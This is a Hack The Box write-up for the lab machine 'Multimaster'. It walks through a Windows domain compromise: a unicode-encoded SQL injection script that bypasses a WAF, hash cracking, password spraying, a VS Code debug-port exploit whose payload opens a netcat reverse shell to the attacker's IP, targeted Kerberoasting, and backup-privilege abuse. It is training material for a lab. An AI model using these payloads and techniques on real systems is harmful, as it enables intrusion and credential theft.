---
layout: single
title: Multimaster - Hack The Box
excerpt: "Multimaster was a challenging Windows machine that starts with an SQL injection so we can get a list of hashes. The box author threw a little curve ball here and it took me a while to figure that the hash type was Keccak-384, and not SHA-384. After successfully spraying the cracked password, we exploit a local command execution vulnerability in VS Code, then find a password in a DLL file, perform a targeted Kerberoasting attack and finally use our Server Operators group membership to get the flag."
date: 2020-09-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-multimaster/multimaster_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - ad
  - password spray
  - kerberoasting
  - keccak
  - sqli
  - winrm
  - powerview
  - vs code
  - chisel
  - server operators
  - backup operators
---

![](/assets/images/htb-writeup-multimaster/multimaster_logo.png)

Multimaster was a challenging Windows machine that starts with an SQL injection so we can get a list of hashes. The box author threw a little curve ball here and it took me a while to figure that the hash type was Keccak-384, and not SHA-384. After successfully spraying the cracked password, we exploit a local command execution vulnerability in VS Code, then find a password in a DLL file, perform a targeted Kerberoasting attack and finally use our Server Operators group membership to get the flag.

## Summary

- There's an SQL injection in the web application search API the allow use to get database hashes
- After finding that the hash used is Keccak-384, we are able to crack 3 passwords
- After bruteforcing usernames with kerbrute, we spray the passwords we found and get one valid account for `alcibiades`
- User `alcibiades` can log in with WinRM and we use a local command execution vulnerability in VS Code to get another shell as user `cyork`
- User `cyork` has access to the .dll file of the ASP .NET webapp which contains the password `D3veL0pM3nT!` for the database `finder` user
- We spray that `D3veL0pM3nT!` password and find that `sbauer` uses the same password
- User `sbauer` has GenericWrite rights on user `jorden` so we can add an SPN to that user and kerberoast it
- After cracking the hash for `jorden` and logging in, we see that he is a member of `Server Operators`
- `Server Operators` have `SeBackupPrivilege` rights so we can read the administrators flag file

## Portscan

Since this is a Windows box, I expected there would be many ports open.

A few things stand out looking at the nmap output:
- It's a domain controller because port 88 is open
- The domain is MEGACORP.LOCAL
- Microsoft SQL Server is running
- IIS is running, maybe there's a web app that uses an SQL backend
- RDP is open but I doubt we can do anything with it

```
root@kali:~/htb/multimaster# nmap -p- 10.10.10.179
[..]]
PORT      STATE  SERVICE       VERSION
53/tcp    open   domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open   http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-07 19:24:04Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
1433/tcp  open   ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-03-07T19:10:19
|_Not valid after:  2050-03-07T19:10:19
|_ssl-date: 2020-03-07T19:26:37+00:00; +9m03s from scanner time.
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2020-03-07T19:26:23+00:00
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2020-03-06T19:09:42
|_Not valid after:  2020-09-05T19:09:42
|_ssl-date: 2020-03-07T19:26:36+00:00; +9m02s from scanner time.
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49673/tcp open   msrpc         Microsoft Windows RPC
49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open   msrpc         Microsoft Windows RPC
49676/tcp open   msrpc         Microsoft Windows RPC
49693/tcp open   msrpc         Microsoft Windows RPC
49696/tcp open   msrpc         Microsoft Windows RPC
63393/tcp closed unknown
63421/tcp closed unknown
```

## Web enumeration

The website is an employee hub page written in Vue.js, but most of the links are not working.

![](/assets/images/htb-writeup-multimaster/web1.png)

The login page is also not functional.

![](/assets/images/htb-writeup-multimaster/web2.png)

The only thing that appears to work is the 'Colleague Finder' page:

![](/assets/images/htb-writeup-multimaster/colleagues.png)

The output from the query is JSON and Vue.js takes care of rendering the page.

![](/assets/images/htb-writeup-multimaster/sql1.png)

When I tried different SQL injection payloads like single quotes I got 403 error messages, as well as when I sent too many queries so I knew there was some kind of WAF on the box. However by unicode encoding the characters I was able to bypass the WAF. Here I replaced a single quote by its unicode encoding and got a `null` answer instead of a 403 or empty JSON array.

![](/assets/images/htb-writeup-multimaster/sql2.png)

I wrote a quick script to make SQLi testing faster than using Burp.

```python
#!/usr/bin/python

import readline
import requests

url = "http://10.10.10.179/api/getColleagues"
proxies = { "http": "127.0.0.1:8080" }

def unicode_crap(txt):
	out = ""
	for i in txt:
		out = out + '\\u00%s' % hex(ord(i))[2:]
	return out

while True:
	headers = {
		"Content-type": "application/json"
	}
	cmd = raw_input("> ")
	encoded_cmd = unicode_crap(cmd)
	payload = '{"name": "' + encoded_cmd + '"}'
	print payload
	r = requests.post(url, data=payload, headers=headers, proxies=proxies)
	print r.text
	print("------------------------------------------------------")
```

Here, I found how many columns were in the table and I was able to use a UNION injection to include arbitrary data.

![](/assets/images/htb-writeup-multimaster/sql3.png)

Found the current DB name: `Hub_DB`

![](/assets/images/htb-writeup-multimaster/sql4.png)

Enumerated the tables in the database: `Colleagues` and `Logins`

![](/assets/images/htb-writeup-multimaster/sql5.png)

In the `Logins` table, I enumerated the columns and found the `password` one:

![](/assets/images/htb-writeup-multimaster/sql6.png)

Then I had all the pieces I needed to dump the `Logins` table:

![](/assets/images/htb-writeup-multimaster/sql7.png)

There's a bunch of accounts in there and after cleaning up the duplicate hashes I have the following list:

```
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
```

At first that looked like some SHA-384 hashes but after trying a few different hash algorithms I was able to crack all of them except one using Keccak-384.

`hashcat -a 0 -m 17900 --force users_sqli_dump_hashes.txt /usr/share/wordlists/rockyou.txt`

![](/assets/images/htb-writeup-multimaster/sqlhash.png)

## Enumerating users on the box

To check for valid accounts on the system I used kerbrute with the `xato-net-10-million-usernames.txt` wordlist.

![](/assets/images/htb-writeup-multimaster/kerbrute.png)

The highlighted account `alcibiades@megacorp.local` is the one I was able to password spray.

## Password spraying the credentials from the database

To password spray, I built a user file containing all the stuff from kerbrute plus the other accounts I had found from the SQL database. The password file only has the 3 password I managed to crack from the SQL hashes.

Then I used crackmapexec to check the user/pass combinations against SMB.

![](/assets/images/htb-writeup-multimaster/crackmapexec.png)

As shown above, the `alcibiades:finance1` are valid credentials.

The `alcibiades` user can log in to the machine with WinRM and I was able to get the user flag.

![](/assets/images/htb-writeup-multimaster/user.png)

## Setting up Windows routing through Kali and joining the domain

Since this was a Windows box with Active Directory running I expected I would need to run various tools from Powershell and I didn't want to have to fight the AV running on the box so I fired up my Commando VM, routed it to the HTB lab through my Kali box (where NAT was configured) and joined it to the domain.

Here's my script to configure IPv4 forwarding and NAT in Kali

```
#!/bin/sh

echo 1 > /proc/sys/net/ipv4/ip_forward
/sbin/iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
/sbin/iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT
```

And here's how I added the route for 10.10.10.0/24 on Windows (note the -p arguments, this is important so I don't lose the changes after the reboot)

![](/assets/images/htb-writeup-multimaster/win_route.png)

I also configured my DNS settings to point to 10.10.10.179 so I can find the megacorp.local domain.

By default, Windows users can add up to 10 machines to the domain so I just added my VM using the credentials from `alcibiades`

![](/assets/images/htb-writeup-multimaster/win_domain2.png)

After rebooting, I added the `alcibiades` users to the local administators group on my machine. Luckily for me, there wasn't any GPO preventing me from logging in with my local admin account.

```
PS C:\Windows\system32 > net localgroup administrators alcibiades /add
The command completed successfully.
```

Now I can log in to the server from my Windows VM:

![](/assets/images/htb-writeup-multimaster/winrm_alcibiades.png)

## Priv esc from alcibiades to cyork

Alcibiades doesn't have any special privileges and he's just a member of the `Domain Users` group and the `Remote Management Users`. I did notice that there was some odd ports listening on localhost when I checked out the `netstat` output.

![](/assets/images/htb-writeup-multimaster/netstat.png)

The ports did seem to change every few minutes because when I re-ran the command I got different results. This pointed me in the direction of some scheduled task running in the background.

![](/assets/images/htb-writeup-multimaster/netstat2.png)

Checking the list of running processes I noticed that the VS Code application was running. When I checked the output a few times I saw that the PID was changing so I assumed this was the scheduled task running. I tried listing the scheduled tasks from Powershell but my user didn't have sufficient privileges.

![](/assets/images/htb-writeup-multimaster/getprocess.png)

Phra from the Donkeys HTB team has a [blog post](https://iwantmore.pizza/posts/cve-2019-1414.html) about CVE-2019-1414 which lets users get local execution by using the debug port on the VS Code Node.js server.

In a nutshell, the debug port is bound to random TCP port everytime the application starts. Since I already had a shell on the machine I could watch the output of the netstat command and see what port is currently in use.

I won't paste the entire nodejs PoC since it's already in the blog post but I did change the `spawnSync` arguments since the PoC was using using bash and Multimaster is a Windows box. It took me a while to figure out that forward slashes were required. I didn't want to get bogged down in bypassing AV or AMSI so I just called netcat that I had uploaded onto the box.

```javascript
socket.send(JSON.stringify({
      id: 3,
      method: 'Runtime.evaluate',
      params: {
        expression: `spawnSync('/programdata/nc.exe', ['-e', 'cmd.exe', '10.10.14.30', '80'])`
      }
    }))
```

To upload file with WinRM on Windows you can do the following:

```powershell
$sess = new-pssession multimaster.megacorp.local
copy-item -path nc.exe -destination c:\programdata\nc.exe -tosession $sess
```

Because the port was only listening on localhost, I had to get some port-forwarding going. I could have used a Meterpreter shell but instead opted for chisel in SOCKS proxy mode.

![](/assets/images/htb-writeup-multimaster/chisel_server.png)

![](/assets/images/htb-writeup-multimaster/chisel_client.png)

Using proxychains, I launched the exploit and got a revere shell as user `cyork`

![](/assets/images/htb-writeup-multimaster/codeshell.png)

## Priv esc from cyork to sbauer

That part took a bit of time, I looked around the file system and the only different thing with `cyork` is he's a member of the `Developers` group. I couldn't access anything else until I noticed I had access to the web server .dll file used by the web application. I poked inside and saw that the database `finder` user credentials were hardcoded inside `C:\inetpub\wwwroot\bin\MultimasterAPI.dll`

![](/assets/images/htb-writeup-multimaster/dllpassword.png)

I sprayed that password across all the accounts and found a match for `sbauer:D3veL0pM3nT!`

![](/assets/images/htb-writeup-multimaster/sbauer_spray.png)

## Priv esc from sbauer to jorden

Using Powerview, I checked the ACL's and saw an interesting entry:

![](/assets/images/htb-writeup-multimaster/powerview.png)

`sbauer` has `GenericWrite` privileges on `jorden` which means we can change some his attributes like logon script, etc. An interesting technique here is we can add an SPN to the account then kerberoast it.

Ref: [Targeted Kerberoasting](https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/)

So I just had to add an SPN to `jorden` then was able to kerberoast his account.

![](/assets/images/htb-writeup-multimaster/jordenkerb.png)

I was able to crack the hash with John The Ripper: `rainforest786`

![](/assets/images/htb-writeup-multimaster/jordenpwd.png)

I logged back into my Windows VM with the `jorden` user account and confirmed I was able to access the server through WinRM.

![](/assets/images/htb-writeup-multimaster/jordenshell.png)

## Getting the root flag

User `jorden` is a member of the `Server Operators` group, which gives him the `SeBackupPrivilege` and `SeRestorePrivilege` rights.

![](/assets/images/htb-writeup-multimaster/jordenpriv.png)

In a nutshell, using the backup privileges, we can view/change any files on the system. Here because I was pressed for time trying to get first blood on the system I opted to read the flag file directly instead of trying to land a shell as administrator.

I used the following github PoC to read the file.

Ref: [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

![](/assets/images/htb-writeup-multimaster/root.png)